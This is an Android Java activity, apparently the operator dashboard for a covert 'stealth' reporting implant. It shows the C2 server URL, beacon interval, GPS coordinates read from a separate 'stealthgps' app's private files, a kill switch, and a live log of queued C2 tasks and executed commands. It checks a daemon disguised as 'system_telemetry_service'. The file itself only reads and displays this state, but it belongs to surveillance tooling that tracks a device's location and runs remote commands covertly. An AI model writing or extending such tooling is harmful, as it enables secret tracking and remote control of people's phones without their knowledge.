package com.stealthmonitor;

import android.app.Activity;
import android.graphics.Typeface;
import android.graphics.drawable.GradientDrawable;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.text.Layout;
import android.util.TypedValue;
import android.view.Gravity;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.RandomAccessFile;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.LinkedList;
import java.util.Locale;

/**
 * Dashboard activity that displays live status of the reporter daemon and
 * tails its log file in real time.
 *
 * <p><b>Threading model:</b>
 * <ul>
 *   <li>All file I/O and shell calls run on {@code workerThread} (a dedicated
 *       {@link android.os.HandlerThread}) so the main thread is never blocked.</li>
 *   <li>All UI mutations run on the main thread via {@code mainHandler}.</li>
 * </ul>
 *
 * <p><b>Key optimisations:</b>
 * <ul>
 *   <li>Log tail uses a chunked reverse-scan instead of byte-by-byte seeking.</li>
 *   <li>Worker and scroll {@link Runnable}s are pre-allocated fields — no per-tick allocation.</li>
 *   <li>{@link SimpleDateFormat} is a static final field — constructed once.</li>
 *   <li>{@code isUserScrolling} is {@code volatile} — safely read across threads.</li>
 *   <li>Batch view removal via {@link LinearLayout#removeViews} instead of looped
 *       {@link LinearLayout#removeViewAt}.</li>
 * </ul>
 */
public final class MonitorActivity extends Activity {

    // -------------------------------------------------------------------------
    // File paths
    // -------------------------------------------------------------------------

    private static final String LOG_FILE           = "/data/local/tmp/reporter.log";
    private static final String C2_URL_FILE        = "/data/local/tmp/c2_url.txt";
    private static final String PING_INTERVAL_FILE = "/data/system/ping_interval.txt";
    private static final String LOC_FLAG_FILE      = "/data/local/tmp/location_enabled";
    private static final String DISABLE_FILE       = "/data/local/tmp/reporter_disable";
    private static final String COORDS_FILE        = "/data/user/0/com.stealthgps/files/coords.txt";

    // -------------------------------------------------------------------------
    // Colours
    // -------------------------------------------------------------------------

    private static final int TEXT_SECONDARY = 0xFF8B949E;
    private static final int ACCENT_GREEN   = 0xFF3FB950;
    private static final int ACCENT_RED     = 0xFFF85149;
    private static final int ACCENT_YELLOW  = 0xFFD29922;
    private static final int ACCENT_BLUE    = 0xFF58A6FF;

    private static final int LOG_TASK = 0xFFFF9E64;
    private static final int LOG_CMD  = 0xFF79C0FF;
    private static final int LOG_WS   = 0xFFD2A8FF;
    private static final int LOG_ERR  = 0xFFF85149;
    private static final int LOG_INFO = 0xFF7EE787;
    private static final int LOG_DIM  = 0xFF6E7681;

    // -------------------------------------------------------------------------
    // Constants
    // -------------------------------------------------------------------------

    private static final int  MAX_LOG_LINES      = 500;
    /** Hard cap on the number of log entry Views kept in the container (2× lines). */
    private static final int  MAX_LOG_VIEWS       = MAX_LOG_LINES * 2;
    private static final long REFRESH_INTERVAL_MS = 1500L;
    /** Chunk size for the reverse log-tail scan — avoids byte-by-byte seeking. */
    private static final int  TAIL_CHUNK_BYTES    = 64 * 1024; // 64 KB

    /**
     * Pre-constructed once. {@link SimpleDateFormat} is expensive; creating it
     * every 1.5 s would generate unnecessary garbage.
     */
    private static final SimpleDateFormat TIME_FMT =
            new SimpleDateFormat("HH:mm:ss", Locale.US);

    // -------------------------------------------------------------------------
    // Threading
    // -------------------------------------------------------------------------

    private Handler                    mainHandler;
    private Handler                    workerHandler;
    private android.os.HandlerThread   workerThread;

    /**
     * Pre-allocated worker Runnable — avoids a heap allocation every 1.5 seconds.
     * Populated in {@link #onCreate} once all fields are ready.
     */
    private Runnable refreshRunnable;

    /** Pre-allocated scroll-to-bottom Runnable — reused on every auto-scroll. */
    private final Runnable scrollToBottomRunnable = new Runnable() {
        @Override public void run() {
            logScrollView.fullScroll(View.FOCUS_DOWN);
        }
    };

    // -------------------------------------------------------------------------
    // Log-tail state  (accessed only on workerThread)
    // -------------------------------------------------------------------------

    private long lastLogSize     = 0L;
    private long lastLogModified = 0L;

    /**
     * Written on the main thread (touch listener), read on the worker thread.
     * {@code volatile} ensures the worker always sees the latest value without
     * requiring a full synchronisation block.
     */
    private volatile boolean isUserScrolling = false;

    // -------------------------------------------------------------------------
    // Views
    // -------------------------------------------------------------------------

    private TextView     serverUrlView;
    private TextView     pingIntervalView;
    private TextView     reporterStatusView;
    private TextView     locationFlagView;
    private TextView     coordsView;
    private TextView     disableFlagView;
    private TextView     lastUpdateView;
    private TextView     logTitle;
    private ScrollView   logScrollView;
    private LinearLayout logEntriesContainer;

    // -------------------------------------------------------------------------
    // Activity lifecycle
    // -------------------------------------------------------------------------

    @Override
    protected void onCreate(final Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
        getWindow().setStatusBarColor(0xFF050508);
        getWindow().setNavigationBarColor(0xFF050508);

        buildUi();

        // Start worker thread.
        workerThread  = new android.os.HandlerThread("monitor-worker");
        workerThread.start();
        workerHandler = new Handler(workerThread.getLooper());
        mainHandler   = new Handler(Looper.getMainLooper());

        // Build the periodic refresh runnable once — never re-allocated.
        refreshRunnable = new Runnable() {
            @Override
            public void run() {
                workerHandler.post(workerTask);
                mainHandler.postDelayed(this, REFRESH_INTERVAL_MS);
            }
        };
    }

    /**
     * The actual work posted to the worker thread on each tick.
     * Pre-allocated as a field — no per-tick heap allocation.
     */
    private final Runnable workerTask = new Runnable() {
        @Override
        public void run() {
            final String reporterStatus = collectReporterStatus();
            final String serverUrl      = readFileOneLine(C2_URL_FILE);
            final String locFlag        = readLocationFlag();
            final String coords         = readFileOneLine(COORDS_FILE);
            final String disableFlag    = readDisableFlag();
            final String pingInterval   = readFileOneLine(PING_INTERVAL_FILE);
            final LogSnapshot snap      = isUserScrolling ? null : collectLogSnapshot();
            final String ts             = TIME_FMT.format(new Date());

            mainHandler.post(new Runnable() {
                @Override
                public void run() {
                    applyReporterStatus(reporterStatus);
                    applyServerUrl(serverUrl);
                    applyLocationFlag(locFlag);
                    applyCoords(coords);
                    applyDisableFlag(disableFlag);
                    applyPingInterval(pingInterval);
                    if (snap != null) {
                        logTitle.setText("reporter.log — live tail");
                        applyLogSnapshot(snap);
                    }
                    lastUpdateView.setText("\u27f3 " + ts);
                }
            });
        }
    };

    @Override
    protected void onResume() {
        super.onResume();
        // Force a full reload when returning to the activity.
        lastLogSize     = 0L;
        lastLogModified = 0L;
        logEntriesContainer.removeAllViews();
        mainHandler.post(refreshRunnable);
    }

    @Override
    protected void onPause() {
        super.onPause();
        mainHandler.removeCallbacks(refreshRunnable);
        // Also cancel any pending worker task to avoid a stale UI post after pause.
        workerHandler.removeCallbacks(workerTask);
    }

    @Override
    protected void onDestroy() {
        mainHandler.removeCallbacks(refreshRunnable);
        workerHandler.removeCallbacks(workerTask);
        if (workerThread != null) {
            workerThread.quitSafely();
        }
        super.onDestroy();
    }

    // -------------------------------------------------------------------------
    // UI construction
    // -------------------------------------------------------------------------

    private void buildUi() {
        final LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackground(new GradientDrawable(
                GradientDrawable.Orientation.TL_BR, new int[]{0xFF020204, 0xFF0A0F1A}));
        root.setPadding(dp(16), dp(24), dp(16), dp(16));

        root.addView(buildTitleBar());
        addVerticalSpacer(root, dp(4));

        // Row 1: DAEMON · UPSTREAM · BEACON
        final LinearLayout row1 = new LinearLayout(this);
        row1.setOrientation(LinearLayout.HORIZONTAL);
        row1.setLayoutParams(matchWrapParams());

        final LinearLayout reporterCard = createCard("DAEMON",   0xFF00FF88);
        reporterStatusView = getCardValueView(reporterCard);
        row1.addView(reporterCard, weightParams());
        addSpacer(row1, dp(12));

        final LinearLayout serverCard = createCard("UPSTREAM", 0xFFB300FF);
        serverUrlView = getCardValueView(serverCard);
        row1.addView(serverCard, weightParams());
        addSpacer(row1, dp(12));

        final LinearLayout intervalCard = createCard("BEACON",   0xFFFF007F);
        pingIntervalView = getCardValueView(intervalCard);
        row1.addView(intervalCard, weightParams());
        root.addView(row1);
        addVerticalSpacer(root, dp(12));

        // Row 2: GPS_LINK · COORDINATES
        final LinearLayout row2 = new LinearLayout(this);
        row2.setOrientation(LinearLayout.HORIZONTAL);
        row2.setLayoutParams(matchWrapParams());

        final LinearLayout locCard = createCard("GPS_LINK",     0xFF00FFFF);
        locationFlagView = getCardValueView(locCard);
        row2.addView(locCard, weightParams());
        addSpacer(row2, dp(12));

        final LinearLayout coordsCard = createCard("COORDINATES", 0xFF00FFFF);
        coordsView = getCardValueView(coordsCard);
        row2.addView(coordsCard, weightParams());
        root.addView(row2);
        addVerticalSpacer(root, dp(12));

        // Row 3: OVERRIDE_LOCK (full width)
        final LinearLayout disableCard = createCard("OVERRIDE_LOCK", 0xFFFF2222);
        disableFlagView = getCardValueView(disableCard);
        root.addView(disableCard);
        addVerticalSpacer(root, dp(20));

        // Log header
        final LinearLayout logHeader = new LinearLayout(this);
        logHeader.setOrientation(LinearLayout.HORIZONTAL);
        logHeader.setGravity(Gravity.CENTER_VERTICAL);
        logHeader.setPadding(dp(4), 0, dp(4), dp(8));

        logTitle = new TextView(this);
        logTitle.setText("> /var/log/syslog --tail");
        logTitle.setTextColor(0xFF8899AA);
        logTitle.setTextSize(TypedValue.COMPLEX_UNIT_SP, 12);
        logTitle.setTypeface(Typeface.create("monospace", Typeface.BOLD));
        logHeader.addView(logTitle);
        root.addView(logHeader);

        // Log scroll area
        final GradientDrawable logBorder = new GradientDrawable();
        logBorder.setColor(0x880A0F16);
        logBorder.setStroke(dp(1), 0x5500FFFF);
        logBorder.setCornerRadius(dp(12));

        logScrollView = new ScrollView(this);
        logScrollView.setBackground(logBorder);
        logScrollView.setPadding(dp(16), dp(16), dp(16), dp(16));
        logScrollView.setFillViewport(true);
        logScrollView.setLayoutParams(
                new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, 0, 1.0f));

        logScrollView.setOnTouchListener(new View.OnTouchListener() {
            @Override
            public boolean onTouch(final View v, final MotionEvent event) {
                isUserScrolling = true;
                final int action = event.getAction();
                if (action == MotionEvent.ACTION_UP || action == MotionEvent.ACTION_CANCEL) {
                    mainHandler.postDelayed(clearScrollingFlag, 1000L);
                }
                return false;
            }
        });

        logEntriesContainer = new LinearLayout(this);
        logEntriesContainer.setOrientation(LinearLayout.VERTICAL);
        logEntriesContainer.setLayoutParams(new ScrollView.LayoutParams(
                ScrollView.LayoutParams.MATCH_PARENT, ScrollView.LayoutParams.WRAP_CONTENT));
        logScrollView.addView(logEntriesContainer);
        root.addView(logScrollView);

        setContentView(root);
    }

    /** Pre-allocated — avoids a closure allocation on every touch-up event. */
    private final Runnable clearScrollingFlag = new Runnable() {
        @Override public void run() { isUserScrolling = false; }
    };

    private LinearLayout buildTitleBar() {
        final LinearLayout titleBar = new LinearLayout(this);
        titleBar.setOrientation(LinearLayout.HORIZONTAL);
        titleBar.setGravity(Gravity.CENTER_VERTICAL);
        titleBar.setPadding(0, 0, 0, dp(20));

        final View titleDot = new View(this);
        final GradientDrawable dotBg = new GradientDrawable();
        dotBg.setShape(GradientDrawable.OVAL);
        dotBg.setColor(0xFF00FF88);
        titleDot.setBackground(dotBg);
        titleDot.setLayoutParams(new LinearLayout.LayoutParams(dp(10), dp(10)));

        final android.animation.ObjectAnimator pulse =
                android.animation.ObjectAnimator.ofFloat(titleDot, "alpha", 1f, 0.3f);
        pulse.setDuration(800);
        pulse.setRepeatCount(android.animation.ValueAnimator.INFINITE);
        pulse.setRepeatMode(android.animation.ValueAnimator.REVERSE);
        pulse.start();
        titleBar.addView(titleDot);

        final TextView titleText = new TextView(this);
        titleText.setText(" SYSTEM_MONITOR");
        titleText.setTextColor(0xFFFFFFFF);
        titleText.setTextSize(TypedValue.COMPLEX_UNIT_SP, 22);
        titleText.setTypeface(Typeface.create("sans-serif-black", Typeface.BOLD));
        titleText.setLetterSpacing(0.05f);
        titleText.setPadding(dp(8), 0, 0, 0);
        titleText.setShadowLayer(10f, 0f, 0f, 0xAA00FF88);
        titleBar.addView(titleText);

        // Flexible spacer pushes lastUpdateView to the right.
        final TextView spacer = new TextView(this);
        spacer.setLayoutParams(new LinearLayout.LayoutParams(0, 0, 1.0f));
        titleBar.addView(spacer);

        lastUpdateView = new TextView(this);
        lastUpdateView.setTextColor(0xFF00FFFF);
        lastUpdateView.setTextSize(TypedValue.COMPLEX_UNIT_SP, 12);
        lastUpdateView.setTypeface(Typeface.create("monospace", Typeface.NORMAL));
        lastUpdateView.setShadowLayer(5f, 0f, 0f, 0x8800FFFF);
        titleBar.addView(lastUpdateView);

        return titleBar;
    }

    // -------------------------------------------------------------------------
    // Log snapshot collection  (runs on workerThread)
    // -------------------------------------------------------------------------

    /** Value object carrying a log update from the worker thread to the UI thread. */
    private static final class LogSnapshot {
        boolean fullReload;
        LinkedList<String> lines = new LinkedList<>();
    }

    private LogSnapshot collectLogSnapshot() {
        final LogSnapshot snap = new LogSnapshot();

        File logFile = new File(LOG_FILE);
        if (!logFile.exists()) {
            snap.fullReload = true;
            snap.lines.add("Log file endpoint unavailable");
            return snap;
        }

        final long currentSize     = logFile.length();
        final long currentModified = logFile.lastModified();

        // Full reload: file was truncated/rotated, or first run.
        if (currentSize < lastLogSize || currentModified != lastLogModified) {
            snap.fullReload = true;
            snap.lines      = tailLogLines(logFile, MAX_LOG_LINES);
            lastLogSize     = currentSize;
            lastLogModified = currentModified;
            return snap;
        }

        // Incremental: read only the new bytes appended since last check.
        if (currentSize > lastLogSize) {
            final long delta = currentSize - lastLogSize;
            // Cap to 1 MB to guard against a sudden huge write.
            final int toRead = (int) Math.min(delta, 1024 * 1024);
            try (final RandomAccessFile raf = new RandomAccessFile(logFile, "r")) {
                raf.seek(lastLogSize);
                final byte[] buf = new byte[toRead];
                raf.readFully(buf);
                for (final String line : new String(buf, StandardCharsets.UTF_8).split("\n")) {
                    if (!line.isEmpty()) snap.lines.add(line);
                }
            } catch (final IOException e) {
                // Non-fatal — next tick will retry.
            }
        }

        lastLogSize     = currentSize;
        lastLogModified = currentModified;
        return snap;
    }

    /**
     * Reads up to {@code maxLines} lines from the end of {@code logFile} using a
     * chunked reverse-scan strategy.
     *
     * <p>Instead of seeking one byte at a time (O(n) seeks), this method reads
     * {@link #TAIL_CHUNK_BYTES}-sized blocks backwards through the file, scanning
     * each block in memory. This reduces syscall count dramatically for large files.
     */
    private static LinkedList<String> tailLogLines(final File logFile, final int maxLines) {
        final LinkedList<String> lines = new LinkedList<>();
        try (final RandomAccessFile raf = new RandomAccessFile(logFile, "r")) {
            long fileLength = raf.length();
            if (fileLength == 0) return lines;

            final StringBuilder current = new StringBuilder();
            long pointer = fileLength;

            while (pointer > 0 && lines.size() < maxLines) {
                final long chunkStart = Math.max(0, pointer - TAIL_CHUNK_BYTES);
                final int  chunkSize  = (int) (pointer - chunkStart);
                final byte[] chunk    = new byte[chunkSize];

                raf.seek(chunkStart);
                raf.readFully(chunk);

                // Scan the chunk backwards.
                for (int i = chunkSize - 1; i >= 0 && lines.size() < maxLines; i--) {
                    final char c = (char) (chunk[i] & 0xFF);
                    if (c == '\n') {
                        if (current.length() > 0) {
                            lines.addFirst(current.reverse().toString());
                            current.setLength(0);
                        }
                    } else if (c != '\r') {
                        current.append(c);
                    }
                }
                pointer = chunkStart;
            }

            // Flush the last partial line (the very first line of the file).
            if (current.length() > 0 && lines.size() < maxLines) {
                lines.addFirst(current.reverse().toString());
            }
        } catch (final IOException ignored) {}
        return lines;
    }

    // -------------------------------------------------------------------------
    // Status collection  (runs on workerThread)
    // -------------------------------------------------------------------------

    private String collectReporterStatus() {
        Process process = null;
        try {
            process = Runtime.getRuntime().exec("getprop init.svc.system_telemetry_service");
            try (final BufferedReader reader =
                         new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                final String status = reader.readLine();
                if ("running".equals(status)) return "RUNNING";
            }
        } catch (final Exception ignored) {
        } finally {
            // Always wait + destroy to prevent descriptor leaks.
            if (process != null) {
                try {
                    process.waitFor();
                } catch (final InterruptedException e) {
                    Thread.currentThread().interrupt();
                } finally {
                    process.destroy();
                }
            }
        }

        // Fallback: check log file recency.
        File logFile = new File(LOG_FILE);
        if (logFile.exists()) {
            long intervalSeconds = 60L;
            final String intervalValue = readFileOneLine(PING_INTERVAL_FILE);
            if (intervalValue != null) {
                try {
                    final long parsed = Long.parseLong(intervalValue.trim());
                    if (parsed >= 1) intervalSeconds = parsed;
                } catch (final NumberFormatException ignored) {}
            }
            final long threshold = Math.max(30_000L, intervalSeconds * 1000L + 15_000L);
            if ((System.currentTimeMillis() - logFile.lastModified()) < threshold) {
                return "ACTIVE";
            }
        }
        return "NOT_RUNNING";
    }

    private String readLocationFlag() {
        final File f = new File(LOC_FLAG_FILE);
        if (!f.exists()) return "DEFAULT(1)";
        final String val = readFileOneLine(LOC_FLAG_FILE);
        return val != null ? val.trim() : "?";
    }

    private static String readDisableFlag() {
        return new File(DISABLE_FILE).exists() ? "DISABLED" : "ENABLED";
    }

    // -------------------------------------------------------------------------
    // UI application  (runs on mainThread)
    // -------------------------------------------------------------------------

    private void applyReporterStatus(final String status) {
        if ("RUNNING".equals(status)) {
            reporterStatusView.setText("RUNNING (system_telemetry_service)");
            reporterStatusView.setTextColor(ACCENT_GREEN);
        } else if ("ACTIVE".equals(status)) {
            reporterStatusView.setText("ACTIVE (log updating)");
            reporterStatusView.setTextColor(ACCENT_YELLOW);
        } else {
            reporterStatusView.setText("NOT RUNNING");
            reporterStatusView.setTextColor(ACCENT_RED);
        }
    }

    private void applyServerUrl(final String url) {
        serverUrlView.setText((url != null && !url.isEmpty()) ? url : "DEFAULT");
        serverUrlView.setTextColor(ACCENT_BLUE);
    }

    private void applyLocationFlag(final String flag) {
        if ("1".equals(flag) || "DEFAULT(1)".equals(flag)) {
            locationFlagView.setText("ENABLED");
            locationFlagView.setTextColor(ACCENT_GREEN);
        } else if ("0".equals(flag)) {
            locationFlagView.setText("DISABLED");
            locationFlagView.setTextColor(ACCENT_RED);
        } else {
            locationFlagView.setText(flag);
            locationFlagView.setTextColor(ACCENT_YELLOW);
        }
    }

    private void applyCoords(final String coords) {
        if (coords != null && !coords.isEmpty()) {
            coordsView.setText(coords.trim());
            coordsView.setTextColor(ACCENT_GREEN);
        } else {
            coordsView.setText("No fix");
            coordsView.setTextColor(ACCENT_YELLOW);
        }
    }

    private void applyDisableFlag(final String flag) {
        if ("DISABLED".equals(flag)) {
            disableFlagView.setText("DISABLED");
            disableFlagView.setTextColor(ACCENT_RED);
        } else {
            disableFlagView.setText("ENABLED");
            disableFlagView.setTextColor(ACCENT_GREEN);
        }
    }

    private void applyPingInterval(final String interval) {
        if (interval != null && !interval.isEmpty()) {
            pingIntervalView.setText(interval.trim() + "s");
            pingIntervalView.setTextColor(ACCENT_BLUE);
        } else {
            pingIntervalView.setText("default");
            pingIntervalView.setTextColor(ACCENT_YELLOW);
        }
    }

    private void applyLogSnapshot(final LogSnapshot snap) {
        if (snap.fullReload) {
            logEntriesContainer.removeAllViews();
            for (final String line : snap.lines) addLogEntry(line);
            if (!isUserScrolling) {
                logScrollView.post(scrollToBottomRunnable);
            }
            return;
        }

        if (snap.lines.isEmpty()) return;

        final boolean wasAtBottom = isAtBottom();
        for (final String line : snap.lines) addLogEntry(line);

        // Prune excess views in a single batch call — O(1) vs O(n) for looped removeViewAt.
        final int viewCount = logEntriesContainer.getChildCount();
        if (viewCount > MAX_LOG_VIEWS) {
            logEntriesContainer.removeViews(0, viewCount - MAX_LOG_VIEWS);
        }

        if (wasAtBottom && !isUserScrolling) {
            logScrollView.post(scrollToBottomRunnable);
        }
    }

    // -------------------------------------------------------------------------
    // Log entry rendering
    // -------------------------------------------------------------------------

    private void addLogEntry(final String rawLine) {
        if (rawLine == null || rawLine.isEmpty()) return;

        if (rawLine.contains("\u2500\u2500 Report cycle start \u2500\u2500")) {
            addLogDivider();
            return;
        }

        String timestamp = null;
        String message   = rawLine;
        if (rawLine.startsWith("[") && rawLine.contains("] ")) {
            final int end = rawLine.indexOf("] ");
            if (end > 1) {
                timestamp = rawLine.substring(1, end);
                message   = rawLine.substring(end + 2);
            }
        }

        final int messageColor = pickLineColor(message);

        final LinearLayout entryCard = new LinearLayout(this);
        entryCard.setOrientation(LinearLayout.VERTICAL);
        entryCard.setPadding(dp(12), dp(10), dp(12), dp(10));

        final GradientDrawable entryBg = new GradientDrawable(
                GradientDrawable.Orientation.TL_BR, new int[]{0xAA121722, 0xAA0B1018});
        entryBg.setCornerRadius(dp(12));
        entryBg.setStroke(dp(1), (messageColor & 0x00FFFFFF) | (110 << 24));
        entryCard.setBackground(entryBg);

        final LinearLayout.LayoutParams entryParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        entryParams.setMargins(0, 0, 0, dp(8));
        entryCard.setLayoutParams(entryParams);

        final LinearLayout headerRow = new LinearLayout(this);
        headerRow.setOrientation(LinearLayout.HORIZONTAL);
        headerRow.setGravity(Gravity.CENTER_VERTICAL);

        final View accentBar = new View(this);
        final GradientDrawable accentBg = new GradientDrawable();
        accentBg.setShape(GradientDrawable.RECTANGLE);
        accentBg.setCornerRadius(dp(2));
        accentBg.setColor(messageColor);
        accentBar.setBackground(accentBg);
        accentBar.setLayoutParams(new LinearLayout.LayoutParams(dp(6), dp(28)));
        headerRow.addView(accentBar);

        final LinearLayout textColumn = new LinearLayout(this);
        textColumn.setOrientation(LinearLayout.VERTICAL);
        textColumn.setLayoutParams(
                new LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1.0f));
        textColumn.setPadding(dp(10), 0, 0, 0);

        if (timestamp != null) {
            final TextView tsView = new TextView(this);
            tsView.setText(timestamp);
            tsView.setTextColor(TEXT_SECONDARY);
            tsView.setTextSize(TypedValue.COMPLEX_UNIT_SP, 10);
            tsView.setTypeface(Typeface.create("monospace", Typeface.BOLD));
            tsView.setLetterSpacing(0.04f);
            textColumn.addView(tsView);
        }

        final TextView msgView = new TextView(this);
        msgView.setText(message);
        msgView.setTextColor(messageColor);
        msgView.setTextSize(TypedValue.COMPLEX_UNIT_SP, 13);
        msgView.setTypeface(Typeface.create("monospace", Typeface.NORMAL));
        msgView.setLineSpacing(dp(3), 1.05f);
        msgView.setIncludeFontPadding(false);
        msgView.setBreakStrategy(Layout.BREAK_STRATEGY_HIGH_QUALITY);
        msgView.setHyphenationFrequency(Layout.HYPHENATION_FREQUENCY_NORMAL);
        msgView.setPadding(0, dp(2), 0, 0);
        textColumn.addView(msgView);

        headerRow.addView(textColumn);
        entryCard.addView(headerRow);
        logEntriesContainer.addView(entryCard);
    }

    private void addLogDivider() {
        final TextView label = new TextView(this);
        label.setText("REPORT CYCLE");
        label.setTextColor(ACCENT_BLUE);
        label.setTextSize(TypedValue.COMPLEX_UNIT_SP, 10);
        label.setTypeface(Typeface.create("sans-serif-medium", Typeface.BOLD));
        label.setLetterSpacing(0.12f);
        label.setGravity(Gravity.CENTER_HORIZONTAL);
        label.setPadding(0, dp(10), 0, dp(6));
        logEntriesContainer.addView(label);

        final View line = new View(this);
        final GradientDrawable lineBg = new GradientDrawable();
        lineBg.setShape(GradientDrawable.RECTANGLE);
        lineBg.setColor(0x3358A6FF);
        line.setBackground(lineBg);
        final LinearLayout.LayoutParams lp =
                new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, dp(1));
        lp.setMargins(dp(18), 0, dp(18), dp(10));
        line.setLayoutParams(lp);
        logEntriesContainer.addView(line);
    }

    private int pickLineColor(final String line) {
        final String l = line.toLowerCase(Locale.US);
        if (l.contains("error") || l.contains("failed") || l.contains("denied") || l.contains("exception")) return LOG_ERR;
        if (l.contains("ws connection") || l.contains("ws command") || l.contains("report sent successfully via ws")) return LOG_WS;
        if (l.contains("queued c2 tasks") || l.contains("json payload:") || l.contains("sending report (")) return LOG_TASK;
        if (l.contains("executing command:")) return LOG_CMD;
        if (l.contains("starting report") || l.contains("report finished") || l.contains("ping interval updated") || l.contains("location tracking set")) return LOG_INFO;
        return LOG_DIM;
    }

    // -------------------------------------------------------------------------
    // Scroll helpers
    // -------------------------------------------------------------------------

    private boolean isAtBottom() {
        if (logScrollView == null || logScrollView.getChildCount() == 0) return true;
        final int childHeight = logScrollView.getChildAt(0).getHeight();
        final int scrollY     = logScrollView.getScrollY();
        final int height      = logScrollView.getHeight();
        return (childHeight - (scrollY + height)) <= dp(10);
    }

    // -------------------------------------------------------------------------
    // Card factory helpers
    // -------------------------------------------------------------------------

    private LinearLayout createCard(final String label, final int accentColor) {
        final GradientDrawable cardBg = new GradientDrawable(
                GradientDrawable.Orientation.TL_BR, new int[]{0x99111822, 0x99050A10});
        cardBg.setStroke(dp(1), accentColor & 0x66FFFFFF);
        cardBg.setCornerRadius(dp(12));

        final LinearLayout card = new LinearLayout(this);
        card.setOrientation(LinearLayout.VERTICAL);
        card.setBackground(cardBg);
        card.setPadding(dp(14), dp(12), dp(14), dp(12));

        final LinearLayout labelRow = new LinearLayout(this);
        labelRow.setOrientation(LinearLayout.HORIZONTAL);
        labelRow.setGravity(Gravity.CENTER_VERTICAL);

        final GradientDrawable dotBg = new GradientDrawable();
        dotBg.setShape(GradientDrawable.OVAL);
        dotBg.setColor(accentColor);

        final View dot = new View(this);
        dot.setBackground(dotBg);
        dot.setLayoutParams(new LinearLayout.LayoutParams(dp(6), dp(6)));

        final android.animation.ObjectAnimator dotPulse =
                android.animation.ObjectAnimator.ofFloat(dot, "alpha", 1f, 0.5f);
        dotPulse.setDuration(1500);
        dotPulse.setRepeatCount(android.animation.ValueAnimator.INFINITE);
        dotPulse.setRepeatMode(android.animation.ValueAnimator.REVERSE);
        dotPulse.start();
        labelRow.addView(dot);

        final TextView labelView = new TextView(this);
        labelView.setText("  " + label);
        labelView.setTextColor(0xFF8899AA);
        labelView.setTextSize(TypedValue.COMPLEX_UNIT_SP, 10);
        labelView.setTypeface(Typeface.create("sans-serif-medium", Typeface.BOLD));
        labelView.setLetterSpacing(0.05f);
        labelRow.addView(labelView);
        card.addView(labelRow);

        final TextView valueView = new TextView(this);
        valueView.setText("...");
        valueView.setTextColor(0xFFFFFFFF);
        valueView.setTextSize(TypedValue.COMPLEX_UNIT_SP, 13);
        valueView.setTypeface(Typeface.create("monospace", Typeface.BOLD));
        valueView.setPadding(0, dp(8), 0, 0);
        valueView.setTag("card_value");
        valueView.setShadowLayer(4f, 0f, 0f, accentColor & 0xAAFFFFFF);
        card.addView(valueView);

        return card;
    }

    private TextView getCardValueView(final LinearLayout card) {
        for (int i = 0; i < card.getChildCount(); i++) {
            final View child = card.getChildAt(i);
            if (child instanceof TextView && "card_value".equals(child.getTag())) {
                return (TextView) child;
            }
        }
        return null;
    }

    // -------------------------------------------------------------------------
    // Layout helpers
    // -------------------------------------------------------------------------

    private static LinearLayout.LayoutParams matchWrapParams() {
        return new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
    }

    private static LinearLayout.LayoutParams weightParams() {
        return new LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1.0f);
    }

    private void addSpacer(final LinearLayout parent, final int width) {
        final View spacer = new View(this);
        spacer.setLayoutParams(new LinearLayout.LayoutParams(width, 1));
        parent.addView(spacer);
    }

    private void addVerticalSpacer(final LinearLayout parent, final int height) {
        final View spacer = new View(this);
        spacer.setLayoutParams(new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, height));
        parent.addView(spacer);
    }

    private int dp(final int value) {
        return (int) TypedValue.applyDimension(
                TypedValue.COMPLEX_UNIT_DIP, value, getResources().getDisplayMetrics());
    }

    // -------------------------------------------------------------------------
    // File helpers
    // -------------------------------------------------------------------------

    private String readFileOneLine(final String path) {
        try (final BufferedReader reader = new BufferedReader(new FileReader(path))) {
            final String line = reader.readLine();
            return line != null ? line.trim() : null;
        } catch (final Exception e) {
            return null;
        }
    }
}